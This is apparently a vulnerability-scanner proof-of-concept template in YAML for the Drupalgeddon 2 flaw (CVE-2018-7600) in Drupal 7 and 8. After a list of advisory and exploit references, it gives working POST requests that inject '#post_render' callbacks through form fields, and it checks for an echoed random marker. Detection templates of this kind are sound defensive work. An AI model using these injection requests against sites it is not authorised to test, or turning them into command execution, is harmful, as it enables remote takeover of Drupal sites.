name: yaml-poc-drupal-drupal-unauthorized_access-CVE-2018-7600
binding: 52882d7c-133b-47f8-a6d6-4f6cb33f8e71
detail:
    author: system_user
    links:
        - http://www.securityfocus.com/bid/103534
        - http://www.securitytracker.com/id/1040598
        - https://badpackets.net/over-100000-drupal-websites-vulnerable-to-drupalgeddon-2-cve-2018-7600/
        - https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714
        - https://github.com/a2u/CVE-2018-7600
        - https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
        - https://greysec.net/showthread.php?tid=2912&pid=10561
        - https://groups.drupal.org/security/faq-2018-002
        - https://lists.debian.org/debian-lts-announce/2018/03/msg00028.html
        - https://research.checkpoint.com/uncovering-drupalgeddon-2/
        - https://twitter.com/RicterZ/status/979567469726613504
        - https://twitter.com/RicterZ/status/984495201354854401
        - https://twitter.com/arancaytar/status/979090719003627521
        - https://www.debian.org/security/2018/dsa-4156
        - https://www.drupal.org/sa-core-2018-002
        - https://www.exploit-db.com/exploits/44448/
        - https://www.exploit-db.com/exploits/44449/
        - https://www.exploit-db.com/exploits/44482/
        - https://www.synology.com/support/security/Synology_SA_18_17
        - https://www.tenable.com/blog/critical-drupal-core-vulnerability-what-you-need-to-know
    vulnerability:
        id: cb83e9cc-1b8e-4003-9997-b4d4a357b738
        level: critical
transport: http
set:
    r1: randomLowercase(4)
    r2: randomLowercase(4)
rules:
    drupal70:
        request:
            cache: true
            method: POST
            path: /?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
        expression: response.status == 200
        output:
            search: '"name=\"form_build_id\"\\s+value=\"(?P<build_id>.+?)\"".bsubmatch(response.body)'
            build_id: search["build_id"]
    drupal71:
        request:
            cache: true
            method: POST
            path: /?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form_build_id={{build_id}}
        expression: response.body.bcontains(bytes(r1 + "%" + r2))
    drupal80:
        request:
            cache: true
            method: POST
            path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{r1}}%25%25{{r2}}
        expression: response.body.bcontains(bytes(r1 + "%" + r2))
expression: drupal80() || drupal70() && drupal71()
